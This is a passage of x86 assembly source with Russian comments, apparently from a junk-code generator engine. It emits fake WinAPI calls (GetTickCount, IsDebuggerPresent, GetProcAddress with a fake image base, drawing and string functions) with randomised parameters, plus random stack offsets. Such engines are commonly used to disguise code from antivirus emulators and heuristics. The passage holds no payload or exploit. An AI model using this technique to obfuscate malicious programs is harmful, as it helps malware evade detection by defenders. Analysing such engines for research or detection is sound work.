;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_get_moffs8_ebp_local
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;funka faka_get_moffs8_ebp_param
;получение (генерация) случайного 8-мибитного смещения в памяти для регистра ebp (входной параметр);
;например, команда [ebp + 14h] - 14h (байт 0x14) это и есть 8-мибитное смещение в памяти для регистра ebp; 
;ВХОД:
;	ebx		-	etc 
;ВЫХОД:
;	eax		-	случайное 8-мибитное смещение (берется случайный номер входного параметра и строится смещение);  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_get_moffs8_ebp_param:												;moffs8 - mem32 offset8 ebp; 
	push	esi
	mov		esi, [ebx].xfunc_struct_addr
	assume	esi: ptr XTG_FUNC_STRUCT

	push	[esi].param_num												;выбираем случайный номер входного параметра (выбираем случайный входной параметр); 
	call	[ebx].rang_addr

	inc		eax															;как минимум это 1;
	imul	eax, eax, 04												;умножаем на 4; etc
	add		eax, 04														;и добавляем 4 - так как у нас будет так, например: 
																		;push ecx							;входной параметр, это сейчас [esp + 00h]
																		;call	func_1						;вызов функи func_1, теперь чтобы обратиться к входному параметру, нужно сделать [esp + 04h]
																		;...
																		;func_1:
																		;push	ebp							;[esp + 08h]
																		;mov	ebp, esp					;[ebp + 08h] 
																		;mov	dword ptr [ebp + 08], 05 
	pop		esi
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_get_moffs8_ebp_param
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa faka_write_moffs8_for_ebp 
;генерация и запись 1 байта - это либо локальная переменная, либо входной параметр для рега ebp; 
;то есть, например, [ebp - 14h] и [ebp + 1Ch] - -14h - это локальная переменная, а +1Ch - входной параметр; 
;ВХОД:
;	ebx			-	etc
;	eax			-	0 или не ноль =) (число 4); 0 - значит будем генерить локальную переменную, иначе входной параметр
;ВЫХОД:
;	eax			-	сгенерированный и записанный байтек; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
faka_write_moffs8_for_ebp:
	test	eax, eax
	je		_faka_ebpo8_gl_

_faka_ebpo8_gp_:
	call	faka_get_moffs8_ebp_param

	stosb
	jmp		_faka_ebpo8_ret_

_faka_ebpo8_gl_:
	call	faka_get_moffs8_ebp_local

	stosb
_faka_ebpo8_ret_:
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи faka_write_moffs8_for_ebp
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
;============================[FUNCTIONS FOR INSTR WITH EBP & moffs8]=====================================





;========================================================================================================
;генерация фэйк-винапишек
;ВХОД:
;	ebx				-	адрес структуры FAKA_FAKEAPI_GEN
;	[ebx].api_va	-	VirtualAddress, по которому будет лежать (после загрузки проги в память) 
;						адрес нужной винапи функи;
;	edi				-	адрес, куда сгенерировать винапишку (edi = [ebx].tw_api_addr);
;ВЫХОД:
;	(+)				-	сгенерированная винапишка
;	edi				-	адрес для дальнейшей записи кода;
;========================================================================================================

;==================================[GEN WINAPI WITHOUT PARAM]============================================
;======================================[GEN WINAPI CALL]=================================================
;kernel32.dll
;DWORD WINAPI GetVersion(void);
;UINT GetOEMCP(void);
;DWORD WINAPI GetCurrentThreadId(void);
;HANDLE WINAPI GetCurrentProcess(void);
;DWORD WINAPI GetTickCount(void);
;DWORD WINAPI GetCurrentProcessId(void);
;HANDLE WINAPI GetProcessHeap(void);
;UINT GetACP(void);
;LPTSTR WINAPI GetCommandLineA(void);
;HANDLE WINAPI GetCurrentThread(void);
;BOOL WINAPI IsDebuggerPresent(void);
;LCID GetThreadLocale(void);
;LPTSTR WINAPI GetCommandLineW(void);
;LANGID GetSystemDefaultLangID(void);
;LCID GetSystemDefaultLCID(void);
;LANGID GetUserDefaultUILanguage(void);

;user32.dll
;HWND WINAPI GetFocus(void);
;HWND WINAPI GetDesktopWindow(void);
;HCURSOR WINAPI GetCursor(void);
;HWND WINAPI GetActiveWindow(void);
;HWND WINAPI GetForegroundWindow(void);
;HWND WINAPI GetCapture(void);
;DWORD WINAPI GetMessagePos(void);
;LONG WINAPI GetMessageTime(void);
faka_winapi_0_param: 
faka_gen_winapi_call:
	mov		ax, 15FFh
	stosw																;opcode + modrm
	mov		eax, [ebx].api_va											;address (offset32) aka VA; 
	stosd
	ret 
;==================================[GEN WINAPI WITHOUT PARAM]============================================
;======================================[GEN WINAPI CALL]=================================================



;===================================[GEN WINAPI WITH 1 RND PARAM]========================================
;HWND WINAPI GetParent(__in  HWND hWnd);
;BOOL WINAPI IsWindowVisible(__in  HWND hWnd);
;BOOL WINAPI IsIconic(__in  HWND hWnd);
;BOOL WINAPI IsWindowEnabled(__in  HWND hWnd);
;int WINAPI GetDlgCtrlID(__in  HWND hwndCtl);
;HWND WINAPI SetActiveWindow(__in  HWND hWnd); 
;HWND WINAPI GetTopWindow(__in_opt  HWND hWnd);
;BOOL WINAPI IsZoomed(__in  HWND hWnd); 
;int WINAPI GetWindowTextLengthA(__in  HWND hWnd);
;COLORREF GetTextColor(__in  HDC hdc); 
;COLORREF GetBkColor(__in  HDC hdc); 
;DWORD GetObjectType(__in  HGDIOBJ h); 
;int GetMapMode(__in  HDC hdc);
;int GetBkMode(__in  HDC hdc);
faka_winapi_1_param: 
	call	faka_param_rnd_push 										;hWnd; 
	call	faka_gen_winapi_call 
	ret
;===================================[GEN WINAPI WITH 1 RND PARAM]========================================



;===================================[GEN WINAPI WITH 2 RND PARAM]========================================
;HWND WINAPI GetDlgItem(__in_opt  HWND hDlg,__in int nIDDlgItem);
;UINT IsDlgButtonChecked(__in  HWND hDlg,__in  int nIDButton);
;BOOL WINAPI IsChild(__in  HWND hWndParent,__in  HWND hWnd); 
;HGDIOBJ SelectObject(__in  HDC hdc,__in  HGDIOBJ hgdiobj); 
faka_winapi_2_param: 
	call	faka_param_rnd_push 
	call	faka_param_rnd_push
	call	faka_gen_winapi_call
	ret
;===================================[GEN WINAPI WITH 2 RND PARAM]========================================



;==========================================[PtVisible]===================================================
;BOOL PtVisible(__in  HDC hdc,__in  int X,__in  int Y);
faka_winapi_3_param:
faka_PtVisible:
	call	faka_param_rnd_push
	call	faka_param_rnd_push
	call	faka_param_rnd_push

	call	faka_gen_winapi_call 
	
	ret
;==========================================[PtVisible]===================================================
 


;===========================================[MulDiv]===================================================== 
;int MulDiv(__in  int nNumber,__in  int nNumerator,__in  int nDenominator);
faka_MulDiv:
	call	faka_param_rnd_push 										;3 rnd param
	call	faka_param_rnd_push											;2 rnd param
	call	faka_param_rnd_push											;1 rnd param
	call	faka_gen_winapi_call										;call; 
	ret
;===========================================[MulDiv]===================================================== 



;========================================[IsValidCodePage]=============================================== 
;BOOL IsValidCodePage(__in  UINT CodePage);
faka_IsValidCodePage:
	mov		ecx, 37														;push/pop ? ;IBM EBCDIC US-Canada
	mov		edx, 65001													;Unicode (UTF-8) -> при необходимости поменять параметры; 
	call	faka_param_rnd_push___imm32_imm8							;1 rnd param
	call	faka_gen_winapi_call										;call 
	ret
;========================================[IsValidCodePage]=============================================== 



;=========================================[GetDriveTypeA]================================================ 
;UINT WINAPI GetDriveTypeA(__in_opt  LPCTSTR lpRootPathName);
faka_GetDriveTypeA:
	mov		ecx, FAKA_PUSH___IMM8___SPEC
	xor		edx, edx													;while only 0! 
	call	faka_param_push___imm8										;push imm8
	call	faka_gen_winapi_call
	ret
;=========================================[GetDriveTypeA]================================================  



;=========================================[IsValidLocale]================================================
;BOOL IsValidLocale(__in  LCID Locale,__in  DWORD dwFlags); 
faka_IsValidLocale:
	push	02
	call	[ebx].rang_addr

	inc		eax															;LCID_INSTALLED or LCID_SUPPORTED; 
	mov		ecx, FAKA_PUSH___IMM8___SPEC
	xchg	eax, edx 
	call	faka_param_push___imm8										;2 param

	push	05
	call	[ebx].rang_addr

	inc		eax
	shl		eax, 10
	mov		ecx, FAKA_PUSH___IMM32___SPEC
	xchg	eax, edx
	call	faka_param_push___imm32										;1 param: 400h, 800h, 0C00h, 1000h, 1400h; 
	
	call	faka_gen_winapi_call										;call 

	ret 
;=========================================[IsValidLocale]================================================



;========================================[GetSystemMetrics]==============================================
;int WINAPI GetSystemMetrics(__in  int nIndex);
faka_GetSystemMetrics:
	push	100															;64 < 80h -> imm8; 
	call	[ebx].rang_addr

	mov		ecx, FAKA_PUSH___IMM8___SPEC
	xchg	eax, edx
	call	faka_param_push___imm8

	call	faka_gen_winapi_call										;call 

	ret 
;========================================[GetSystemMetrics]============================================== 



;=========================================[CheckDlgButton]===============================================
;BOOL CheckDlgButton(__in  HWND hDlg,__in  int nIDButton,__in  UINT uCheck);
faka_CheckDlgButton: 
	push	03
	call	[ebx].rang_addr

	mov		ecx, FAKA_PUSH___IMM8___SPEC
	xchg	eax, edx
	call	faka_param_push___imm8										;3 param (BST_CHECKED, BST_INDETERMINATE, BST_UNCHECKED); 

	call	faka_param_rnd_push											;2 param
	call	faka_param_rnd_push											;1 param

	call	faka_gen_winapi_call										;call 
	
	ret
;=========================================[CheckDlgButton]===============================================



;==========================================[GetSysColor]=================================================
;========================================[GetSysColorBrush]==============================================
;DWORD WINAPI GetSysColor(__in  int nIndex);
;HBRUSH GetSysColorBrush(__in  int nIndex);
faka_GetSysColor:
faka_GetSysColorBrush:
	push	31 
	call	[ebx].rang_addr

	mov		ecx, FAKA_PUSH___IMM8___SPEC
	xchg	eax, edx
	call	faka_param_push___imm8										;nIndex

	call	faka_gen_winapi_call										;call ;GetSysColor; 

	ret
;==========================================[GetSysColor]=================================================
;========================================[GetSysColorBrush]==============================================



;==========================================[GetKeyState]=================================================
;SHORT WINAPI GetKeyState(__in  int nVirtKey);
faka_GetKeyState:
	mov		ecx, 000													; 
	mov		edx, 255													;
	call	faka_param_rnd_push___imm32_imm8							;1 rnd param
	call	faka_gen_winapi_call										;call 

	ret
;==========================================[GetKeyState]=================================================



;========================================[GetKeyboardType]===============================================
;int WINAPI GetKeyboardType(__in  int nTypeFlag);
faka_GetKeyboardType:
	push	03
	call	[ebx].rang_addr

	mov		ecx, FAKA_PUSH___IMM8___SPEC
	xchg	eax, edx
	call	faka_param_push___imm8										;nTypeFlag; 

	call	faka_gen_winapi_call										;call;  

	ret
;========================================[GetKeyboardType]===============================================



;========================================[GetKeyboardLayout]=============================================
;HKL WINAPI GetKeyboardLayout(__in  DWORD idThread);
faka_GetKeyboardLayout:
	mov		ecx, FAKA_PUSH___IMM8___SPEC
	xor		edx, edx													;push 0 -> cuurent thread; 
	call	faka_param_push___imm8

	call	faka_gen_winapi_call										;
	ret 
;========================================[GetKeyboardLayout]=============================================



;============================================[DrawIcon]==================================================
;BOOL WINAPI DrawIcon(__in  HDC hDC,__in  int X,__in  int Y,__in  HICON hIcon);
faka_winapi_4_param:
faka_DrawIcon: 
	call	faka_param_rnd_push
	call	faka_param_rnd_push
	call	faka_param_rnd_push
	call	faka_param_rnd_push

	call	faka_gen_winapi_call										; 

	ret
;============================================[DrawIcon]==================================================



;===========================================[SetTextColor]===============================================
;============================================[SetBkColor]================================================
;COLORREF SetTextColor(__in  HDC hdc,__in  COLORREF crColor);
;COLORREF SetBkColor(__in  HDC hdc,__in  COLORREF crColor);
;COLORREF GetNearestColor(__in  HDC hdc,__in  COLORREF crColor);
faka_SetTextColor:
faka_SetBkColor:
faka_GetNearestColor:
	mov		ecx, 00h													; 
	mov		edx, 00FFFFFFh												;MAX COLORREF
	call	faka_param_rnd_push___imm32_imm8							;2 rnd param

	call	faka_param_rnd_push											;1 rnd param; 

	call	faka_gen_winapi_call										;call 


	ret
;===========================================[SetTextColor]===============================================
;============================================[SetBkColor]================================================



;============================================[SetBkMode]=================================================
;int SetBkMode(__in  HDC hdc,__in  int iBkMode);
faka_SetBkMode:
	push	02
	call	[ebx].rang_addr

	inc		eax
	mov		ecx, FAKA_PUSH___IMM8___SPEC
	xchg	eax, edx
	call	faka_param_push___imm8

	call	faka_param_rnd_push

	call	faka_gen_winapi_call										; 
	
	ret
;============================================[SetBkMode]=================================================



;============================================[Rectangle]=================================================
;BOOL Rectangle(__in  HDC hdc,__in  int nLeftRect,__in  int nTopRect,__in  int nRightRect,__in  int nBottomRect);
;BOOL Ellipse(__in  HDC hdc,__in  int nLeftRect,__in  int nTopRect,__in  int nRightRect,__in  int nBottomRect);
faka_winapi_5_param:
faka_Rectangle: 
faka_Ellipse:
	call	faka_param_rnd_push
	call	faka_param_rnd_push
	call	faka_param_rnd_push
	call	faka_param_rnd_push
	call	faka_param_rnd_push

	call	faka_gen_winapi_call 
	
	ret
;============================================[Rectangle]=================================================



;======================================[QueryPerformanceCounter]=========================================
;=====================================[QueryPerformanceFrequency]========================================
;BOOL WINAPI QueryPerformanceCounter(__out  LARGE_INTEGER *lpPerformanceCount);
;BOOL WINAPI QueryPerformanceFrequency(__out  LARGE_INTEGER *lpFrequency);
faka_QueryPerformanceCounter:
faka_QueryPerformanceFrequency:
	push	08 
	pop		eax															;sizeof (LARGE_INTEGER)
	call	faka_get_rnd_suit_xdata_va									;получаем случайный подходящий адрес (кратен 4!); 

	test	eax, eax
	je		_faka_Qx_ret_												;если не удалось такой адрес получить, тогда на выход
	
	mov		ecx, FAKA_PUSH___IMM32___SPEC
	xchg	eax, edx
	call	faka_param_push___imm32										;иначе сгенерим параметр вида: push <address> (68h XXXXXXXXh); 

	call	faka_gen_winapi_call										;call
	
_faka_Qx_ret_:
	ret																	;на выход! 
;======================================[QueryPerformanceCounter]=========================================
;=====================================[QueryPerformanceFrequency]========================================



;============================================[lstrcmpiA]=================================================
;============================================[lstrcmpA]==================================================
;int WINAPI lstrcmpiA(__in  LPCTSTR lpString1,__in  LPCTSTR lpString2);
;int WINAPI lstrcmpA(__in  LPCTSTR lpString1,__in  LPCTSTR lpString2); 
faka_lstrcmpiA:
faka_lstrcmpA:
	mov		eax, FAKA_GET_RND_STRA_ADDR
	call	faka_get_rnd_val_va											;получаем адрес случайной строки (в rdata); 

	test	eax, eax
	je		_faka_xA_ret_												;получили 0?
	xchg	eax, esi													;если получили нормальный адрес строки, то сохраним его в esi; 

	mov		eax, FAKA_GET_RND_STRA_ADDR
	call	faka_get_rnd_val_va											;получаем адрес ещё одной строки

	test	eax, eax
	je		_faka_xA_ret_
	cmp		eax, esi													;если 2 адреса одинаковые (адреса на одну и ту же строку), тогда на выход 
	je		_faka_xA_ret_
		
	mov		ecx, FAKA_PUSH___IMM32___SPEC
	xchg	eax, edx
	call	faka_param_push___imm32										;иначе сгенерим push <addr 1> (68h ...);

	mov		ecx, FAKA_PUSH___IMM32___SPEC								;push <addr 2> (68h...);
	mov		edx, esi
	call	faka_param_push___imm32

	call	faka_gen_winapi_call										;call 

_faka_xA_ret_:
	ret
;============================================[lstrcmpiA]=================================================
;============================================[lstrcmpA]==================================================



;==========================================[GetSystemTime]===============================================
;==========================================[GetLocalTime]================================================
;void WINAPI GetSystemTime(__out  LPSYSTEMTIME lpSystemTime); 
;void WINAPI GetLocalTime(__out  LPSYSTEMTIME lpSystemTime);
faka_GetSystemTime:
faka_GetLocalTime:
	push	16
	pop		eax															;sizeof (SYSTEMTYME); 
	call	faka_get_rnd_suit_xdata_va									;получаем случайный подходящий адрес (кратен 4!); 

	test	eax, eax
	je		_faka_Gx_ret_												;если не удалось такой адрес получить, тогда на выход
	
	mov		ecx, FAKA_PUSH___IMM32___SPEC
	xchg	eax, edx
	call	faka_param_push___imm32										;иначе сгенерим параметр вида: push <address> (68h XXXXXXXXh); 

	call	faka_gen_winapi_call										;call
	
_faka_Gx_ret_:
	ret																	;на выход! 
;==========================================[GetSystemTime]===============================================
;==========================================[GetLocalTime]================================================



;============================================[lstrcpyA]==================================================
;LPTSTR WINAPI lstrcpyA(__out  LPTSTR lpString1,__in   LPTSTR lpString2);
faka_lstrcpyA:
																		;строки не должны перекрываться (то есть один адрес, например, должен быть из xdata, а другой из rdata etc); 
	mov		eax, FAKA_GET_RND_STRA_ADDR
	call	faka_get_rnd_val_va											;получаем адрес случайной строки (в rdata); 

	test	eax, eax
	je		_faka_lstrxA_ret_											;получили 0?
	xchg	eax, esi													;сейчас работаем только с ansi-строками! 

	push	esi
	call	xstrlen														;узнаем длину найденной строки;

	inc		eax															;eax = длина строки + '\0'; 
	call	faka_get_rnd_suit_xdata_va									;получаем случайный подходящий адрес (кратен 4!); 

	test	eax, eax
	je		_faka_lstrxA_ret_											;если не удалось такой адрес получить, тогда на выход
	push	eax

	mov		ecx, FAKA_PUSH___IMM32___SPEC
	mov		edx, esi
	call	faka_param_push___imm32										;lpString2
	
	mov		ecx, FAKA_PUSH___IMM32___SPEC								;lpString1
	pop		edx 
	call	faka_param_push___imm32										;иначе сгенерим параметр вида: push <address> (68h XXXXXXXXh); 

	call	faka_gen_winapi_call										;call 

_faka_lstrxA_ret_:
	ret
;============================================[lstrcpyA]==================================================



;============================================[lstrlenA]==================================================
;============================================[CharNextA]=================================================
;===========================================[LoadLibraryA]===============================================
;int WINAPI lstrlenA(__in  LPCTSTR lpString);
;LPTSTR WINAPI CharNextA(__in  LPCTSTR lpsz);
;;HMODULE WINAPI LoadLibraryA(__in  LPCTSTR lpFileName);
faka_lstrlenA:
faka_CharNextA:
;faka_LoadLibraryA:
	mov		eax, FAKA_GET_RND_STRA_ADDR
	call	faka_get_rnd_val_va											;получаем адрес случайной строки (в rdata); 

	test	eax, eax
	je		_faka_lstrlenA_ret_											;получили 0?

	mov		ecx, FAKA_PUSH___IMM32___SPEC								;lpString
	xchg	eax, edx
	call	faka_param_push___imm32										;иначе сгенерим параметр вида: push <address> (68h XXXXXXXXh); 

	call	faka_gen_winapi_call										;call 

_faka_lstrlenA_ret_:
	ret
;============================================[lstrlenA]==================================================
;============================================[CharNextA]=================================================
;===========================================[LoadLibraryA]=============================================== 



;==========================================[GetClientRect]===============================================
;==========================================[GetWindowRect]===============================================
;BOOL WINAPI GetClientRect(__in   HWND hWnd,__out  LPRECT lpRect);
;BOOL WINAPI GetWindowRect(__in   HWND hWnd,__out  LPRECT lpRect);
faka_GetClientRect: 
faka_GetWindowRect:
	push	16
	pop		eax															;sizeof (RECT); 
	call	faka_get_rnd_suit_xdata_va									;получаем случайный подходящий адрес (кратен 4!); 

	test	eax, eax
	je		_faka_gcrx_ret_												;если не удалось такой адрес получить, тогда на выход
	
	mov		ecx, FAKA_PUSH___IMM32___SPEC								;lpRect
	xchg	eax, edx
	call	faka_param_push___imm32										;иначе сгенерим параметр вида: push <address> (68h XXXXXXXXh); 

	call	faka_param_rnd_push											;hWnd

	call	faka_gen_winapi_call										;call 
	
_faka_gcrx_ret_:
	ret																	;на выход! 
;==========================================[GetClientRect]===============================================
;==========================================[GetWindowRect]===============================================



;=========================================[GetModuleHandleA]=============================================
;HMODULE WINAPI GetModuleHandleA(__in_opt  LPCTSTR lpModuleName); 
faka_GetModuleHandleA:
	mov		eax, FAKA_GET_RND_STRA_ADDR
	call	faka_get_rnd_val_va											;получаем адрес случайной строки (в rdata); 

	xchg	eax, edx
	test	edx, edx
	je		_gmhA_0_

	mov		ecx, FAKA_PUSH___IMM32___SPEC								;lpModuleName (addr); 
	call	faka_param_push___imm32										;иначе сгенерим параметр вида: push <address> (68h XXXXXXXXh); 

	jmp		_gmhA_gwc_

_gmhA_0_:
	mov		ecx, FAKA_PUSH___IMM8___SPEC
	call	faka_param_push___imm8

_gmhA_gwc_:
	call	faka_gen_winapi_call										;call 

_faka_gmhA_ret_: 
	ret
;=========================================[GetModuleHandleA]=============================================



;===========================================[GetCursorPos]===============================================
;BOOL WINAPI GetCursorPos(__out  LPPOINT lpPoint);
faka_GetCursorPos:
	push	08
	pop		eax															;sizeof (POINT); 
	call	faka_get_rnd_suit_xdata_va									;получаем случайный подходящий адрес (кратен 4!); 

	test	eax, eax
	je		_faka_gcpx_ret_												;если не удалось такой адрес получить, тогда на выход
	
	mov		ecx, FAKA_PUSH___IMM32___SPEC								;lpPoint
	xchg	eax, edx
	call	faka_param_push___imm32										;иначе сгенерим параметр вида: push <address> (68h XXXXXXXXh); 

	call	faka_gen_winapi_call										;call 
	
_faka_gcpx_ret_:
	ret
;===========================================[GetCursorPos]===============================================



;============================================[LoadIconA]=================================================
;===========================================[LoadCursorA]================================================
;HICON WINAPI LoadIconA(__in_opt  HINSTANCE hInstance,__in      LPCTSTR lpIconName);
;HCURSOR WINAPI LoadCursorA(__in_opt  HINSTANCE hInstance,__in      LPCTSTR lpCursorName);
faka_LoadIconA:
faka_LoadCursorA: 
	push	07
	call	[ebx].rang_addr

	add		eax, 32512

	mov		ecx, FAKA_PUSH___IMM32___SPEC
	xchg	eax, edx
	call	faka_param_push___imm32

	mov		ecx, FAKA_PUSH___IMM8___SPEC
	xor		edx, edx
	call	faka_param_push___imm8

	call	faka_gen_winapi_call										;call 

	ret
;============================================[LoadIconA]=================================================
;===========================================[LoadCursorA]================================================



;===========================================[FindWindowA]================================================
;HWND WINAPI FindWindowA(__in_opt  LPCTSTR lpClassName,__in_opt  LPCTSTR lpWindowName);
faka_FindWindowA:
	mov		eax, FAKA_GET_RND_STRA_ADDR
	call	faka_get_rnd_val_va											;получаем адрес случайной строки (в rdata); 

	xchg	eax, edx
	test	edx, edx
	je		_faka_fwa_ret_

	mov		eax, FAKA_GET_RND_STRA_ADDR
	call	faka_get_rnd_val_va											;получаем адрес случайной строки (в rdata); 

	test	eax, eax
	je		_faka_fwa_ret_
	cmp		eax, edx
	je		_faka_fwa_ret_

	push	eax
	mov		ecx, FAKA_PUSH___IMM32___SPEC
	call	faka_param_push___imm32

	mov		ecx, FAKA_PUSH___IMM32___SPEC								;или push ecx ... pop ecx?; 
	pop		edx
	call	faka_param_push___imm32

	call	faka_gen_winapi_call 

_faka_fwa_ret_:
	ret
;===========================================[FindWindowA]================================================



;==========================================[GetProcAddress]==============================================
;FARPROC WINAPI GetProcAddress(__in  HMODULE hModule,__in  LPCSTR lpProcName);
faka_GetProcAddress: 
	mov		eax, FAKA_GET_RND_STRA_ADDR
	call	faka_get_rnd_val_va											;получаем адрес случайной строки (в rdata); 

	test	eax, eax
	je		_faka_gpa_ret_

	mov		ecx, FAKA_PUSH___IMM32___SPEC
	xchg	eax, edx
	call	faka_param_push___imm32										;lpProcName

	mov		eax, 500h
	call	faka_get_rnd_num_1

	add		eax, 04 
	shl		eax, 20
	mov		ecx, FAKA_PUSH___IMM32___SPEC
	xchg	eax, edx
	call	faka_param_push___imm32										;fake ImageBase (aka hModule);

	call	faka_gen_winapi_call										;call 

_faka_gpa_ret_: 
	ret
;==========================================[GetProcAddress]==============================================

;========================================================================================================
;генерация фейковых винапи функций; 
;========================================================================================================
     



 




